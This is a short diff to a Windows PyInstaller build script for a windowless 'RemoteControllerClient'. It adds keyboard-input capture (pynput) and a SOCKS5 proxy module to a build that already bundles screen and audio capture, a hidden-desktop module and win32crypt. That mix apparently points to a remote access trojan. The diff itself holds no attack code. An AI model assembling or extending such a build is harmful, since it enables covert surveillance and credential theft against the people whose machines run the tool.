@@ -58,6 +58,7 @@ pyinstaller --onefile --name RemoteControllerClient --clean --noconsole --log-le
     --collect-all sounddevice ^
     --collect-all mss ^
     --collect-all numpy ^
+    --collect-all pynput ^
     --collect-submodules remote_client ^
     --hidden-import=win32crypt ^
     --hidden-import=cryptography ^
@@ -67,6 +68,8 @@ pyinstaller --onefile --name RemoteControllerClient --clean --noconsole --log-le
     --hidden-import=remote_client.session_factory ^
     --hidden-import=remote_client.apps.launcher ^
     --hidden-import=remote_client.windows.hidden_desktop ^
+    --hidden-import=remote_client.proxy.socks5_server ^
+    --add-data "remote_client\rc_activity.env;remote_client" ^
     client.py >> "%LOG_PATH%" 2>&1
 if errorlevel 1 (
     echo Ошибка сборки. См. %LOG_PATH%
